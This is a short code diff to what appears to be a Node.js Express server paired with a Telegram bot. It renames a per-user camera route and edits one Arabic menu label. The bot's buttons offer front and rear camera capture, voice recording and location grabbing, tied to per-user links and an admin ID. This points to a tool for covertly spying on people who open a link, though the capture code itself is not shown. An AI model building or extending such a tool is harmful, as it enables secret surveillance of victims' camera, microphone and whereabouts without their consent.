@@ -23,7 +23,7 @@ const adminId = '7130416076';
 const subscribedUsers = new Set();
 
 // مسار الكاميرا
-app.get('/:userId', (req, res) => {
+app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
     const cameraType = req.query.cameraType;
 
@@ -243,7 +243,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', callback_data: 'front_camera' }],
+                [{ text: 'تصوير كاميرا أمامي', callback_data: 'front_camera' }],
                 [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
                 [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
                 [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
